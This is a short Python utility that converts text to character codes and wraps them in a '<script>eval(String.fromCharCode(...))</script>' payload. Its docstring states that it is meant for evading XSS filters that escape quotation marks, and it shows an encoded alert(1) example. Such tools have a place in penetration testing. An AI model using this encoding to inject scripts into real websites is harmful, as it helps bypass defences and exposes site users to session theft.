#!/usr/bin/env python3
""" ascii-vals.py
Used to convert input to its equivalent ASCII-encoding.
This is useful for evading XSS filters that escape quotation marks

Example usage:
    echo -n 'alert(1);'| python ascii-vals.py --javascript-payload
    <script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41, 59))</script>
"""
import argparse

parser = argparse.ArgumentParser(description='Get ASCII values from a payload')
parser.add_argument('--javascript-payload', metavar='jsmode', type=bool, nargs='?', const=True, default=False,
                    help='Print output wrapped in "<script>eval(String.fromCharCode(<PAYLOAD>))</script>')

args = parser.parse_args()
# string = sys.argv[1]
string = input()

x = [ord(char) for char in string]

if args.javascript_payload:
    print(f"<script>eval(String.fromCharCode{tuple(x)})</script>")
else:
    print(tuple(x))
